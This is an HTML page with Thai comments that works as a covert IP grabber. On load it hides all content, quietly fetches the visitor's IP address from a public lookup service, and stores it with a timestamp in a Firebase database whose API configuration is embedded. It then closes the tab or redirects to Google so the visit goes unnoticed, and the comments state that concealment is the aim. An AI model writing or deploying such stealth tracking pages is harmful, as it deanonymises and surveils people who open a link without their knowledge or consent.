<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <title></title> <!-- เอา Title ออกเพื่อไม่ให้เป็นที่สังเกต -->
    <style>
        /* ซ่อนทุกอย่างบนหน้าเว็บ */
        body { display: none; }
    </style>
</head>
<body>
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAv7q5JRh_VnsKNqEDBl-60KruafC7fGfw",
            authDomain: "app-ip-line.firebaseapp.com",
            projectId: "app-ip-line",
            storageBucket: "app-ip-line.firebasestorage.app",
            messagingSenderId: "697728554662",
            appId: "1:697728554662:web:73b67252752e97051c4667",
            measurementId: "G-9YQ4CMNEW1"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // ฟังก์ชันทำงานแบบซ่อนตัว
        async function runStealthMode() {
            try {
                // 1. แอบดึง IP Address
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const userIp = data.ip;

                // 2. บันทึกลงฐานข้อมูล Firebase
                await addDoc(collection(db, "visitor_ips"), {
                    ip_address: userIp,
                    timestamp: new Date()
                });

                // 3. เมื่อเสร็จสิ้น พยายามปิดหน้าต่างทิ้ง
                closeOrRedirect();

            } catch (error) {
                // หากเกิด Error (เช่น ปิดตัวบล็อกโฆษณา) ก็ให้ปิดหน้าต่างทิ้งอยู่ดีเพื่อเนียนๆ
                closeOrRedirect();
            }
        }

        // ฟังก์ชันสำหรับปิดแท็บ หรือ เปลี่ยนหน้า
        function closeOrRedirect() {
            window.close(); // พยายามปิดแท็บ
            
            // หากระบบไม่ยอมปิดแท็บในเวลา 0.1 วินาที ให้เด้งไปหน้าอื่นแทน (ในที่นี้คือ Google)
            setTimeout(() => {
                window.location.replace("https://www.google.com");
            }, 100); 
        }

        // สั่งให้โค้ดทำงานทันทีที่เปิดเว็บ
        runStealthMode();
    </script>
</body>
</html>
